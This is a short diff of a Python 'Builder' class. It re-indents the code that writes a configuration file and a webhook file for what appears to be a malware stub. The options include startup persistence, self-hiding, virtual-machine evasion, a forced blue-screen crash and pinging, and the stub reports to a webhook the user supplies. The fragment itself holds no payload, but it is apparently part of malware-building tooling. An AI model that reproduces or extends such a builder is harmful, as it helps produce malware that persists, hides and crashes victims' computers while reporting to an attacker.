@@ -101,16 +101,16 @@ class Builder:
 					shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
 				else:
 					shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
-			with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
-				configuration = {
+		with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
+			configuration = {
 					"PINGME" : self.PingME.get(),
 					"VMPROTECT" : self.VMprotect.get(),
 					"BSOD" : self.BSOD.get(),
     				"STARTUP" : self.Startup.get(),
     				"HIDE_ITSELF" : self.Hide.get()
-				}
-				json.dump(configuration, file, indent= 4)
-			clear()
+			}
+			json.dump(configuration, file, indent= 4)
+		clear()
 		with open(os.path.join("env", "Scripts", "webhook.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
 			file.write(hook)
 		os.chdir(os.path.join(os.path.dirname(__file__), "env", "Scripts"))
